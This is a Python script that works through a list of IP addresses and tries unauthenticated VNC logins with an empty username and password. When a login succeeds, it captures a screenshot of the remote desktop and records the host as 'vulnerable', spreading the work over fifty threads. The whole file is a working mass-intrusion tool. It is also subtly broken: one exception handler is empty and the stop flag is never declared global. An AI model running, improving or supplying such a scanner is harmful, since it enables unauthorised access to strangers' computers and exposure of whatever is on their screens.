import os
import time
from vncapi import api
import os.path
import threading
import json
from filelock import FileLock
stopThreads = False

def attemptConnect(ips):
     global stopThreads
     for ip in ips:
        if not stopThreads:
            try:
                with open('nonVulnerableIPs.txt') as f:
                    if ip not in f.read():
                        client = api.connect('{}:0'.format(ip),timeout=10, username='', password='')
                        client.captureScreen('screenshot_IP_{}.png'.format(ip))
                        print('Got image from {}'.format(ip))
                        with FileLock("vulnerableIPs.txt.lock"): 
                                with open('vulnerableIPs.txt', "a") as file: 
                                    file.write(ip + "\n")
                                    file.close() #TODO: is there even a point to close these?
                    f.close()
            except:
                print('Cant get image from {}'.format(ip))
                with FileLock("nonVulnerableIPs.txt.lock"):
                        with open('nonVulnerableIPs.txt', "a") as file:
                            file.write(ip + "\n")
                            file.close()

def linearAttemptConnect(ips):
    #Similar to attemptConnect, however it removes the IP's already searched from their memory list 
    #and then saves the leftover IP's when the script is cancelled to the searchingFile
    #This script WILL REMOVE ips from the given file by overwriting them with the memory in the threads
    #However, this will be very very fast!
    global stopThreads
    try:
        for ip in ips:
            if not stopThreads:
                try:
                    client = api.connect('{}:0'.format(ip),timeout=10, username='', password='')
                    client.captureScreen('screenshot_IP_{}.png'.format(ip))
                    print('Got image from {}'.format(ip))
                    with FileLock("vulnerableIPs.txt.lock"): 
                            with open('vulnerableIPs.txt', "a") as file: 
                                file.write(ip + "\n")
                                file.close() #TODO: is there even a point to close these?
                except:
                    print('Cant get image from {}'.format(ip))
                    with FileLock("nonVulnerableIPs.txt.lock"):
                            with open('nonVulnerableIPs.txt', "a") as file:
                                file.write(ip + "\n")
                                file.close()
            ips.remove(ip)
    except KeyboardInterrupt:
         #We want to clear the current searchingFile and replace it with all the IPs currently in memory
         

def createSearchingFile(ipFile, searchingFile):
    print("Linear searching detected. We will now create a text file that is a copy of your current IPs. Creating text file of IPs to search...")
    with open(ipFile) as f:
        lines = f.readlines()
        for line in lines:
            with open(searchingFile, "a") as file: 
                file.write(line)
    print("Text file of IPs created. Beginning linear search...")

def createThread(maxThreads, ips):
        currentIndex = 0
        ipThreadGap = len(ips) // maxThreads
        nextIndex = ipThreadGap
        #the index will be the thread number. the list will contain the ips it has to solve
        ips_to_solve = []
        for i in range(0, maxThreads):
            temp = []
            for x in range(currentIndex, nextIndex): #TODO: simplify with a range(0, ipThreadGap) and use current and next within the loop
                temp.append(ips[x])
            ips_to_solve.append(temp)
            currentIndex += ipThreadGap
            nextIndex += ipThreadGap 
        return ips_to_solve

def parseIPs(textfile):
    if os.path.isfile(textfile):
        print('List of ips detected.')
        with open(textfile) as f:
            lines = f.readlines()
            ips = []
            for line in lines:
                parsedLine = line.split(" ")
                try:
                    ips.append(parsedLine[3])
                except:
                    print("The following line does not work. Skipping line:")
                    print(line)
                    print("")
            f.close()
            print("Done. Proceeding with screenshotting: \n")
    return ips

def main():
    
    maxThreads = 50
    threadRestartTime = 120 #set to super high for no restart
    ipFile = 'ips.txt'
    searchingFile = 'ipsLeft.txt' #basically the amount of ips left to search
    linear = True #set to false for non-linear searching with logging (very slow!)

    #if there is no searchingFile, create one with all the current ips
    if(linear):
        if not os.path.isfile(searchingFile):
            createSearchingFile(ipFile, searchingFile)

    if(linear):
         ips_to_multithread = createThread(maxThreads, parseIPs(searchingFile))
    else:
         ips_to_multithread = createThread(maxThreads, parseIPs(ipFile))

    #Due to an issue in the underlying API, all threads must be restarted.
    #This will resolve issues involving Twisted timeout and such, as this API is not meant to be multithreaded
    #Every time Twisted has an error due to connectivity, it will crash the thread. Thus, we must recreate all threads

    while True:
        stopThreads = False
        for i in range(0, maxThreads):

            if(linear):
                thread = threading.Thread(target=linearAttemptConnect, kwargs={'ips':ips_to_multithread[i]})
                thread.start()
            else:
                thread = threading.Thread(target=attemptConnect, kwargs={'ips':ips_to_multithread[i]})
                thread.start()
        
        time.sleep(threadRestartTime)
        stopThreads = True
        print("Restarting all threads...")
        time.sleep(2)
                


if __name__ == '__main__':
    #if os.geteuid() != 0:
        #exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
    main()
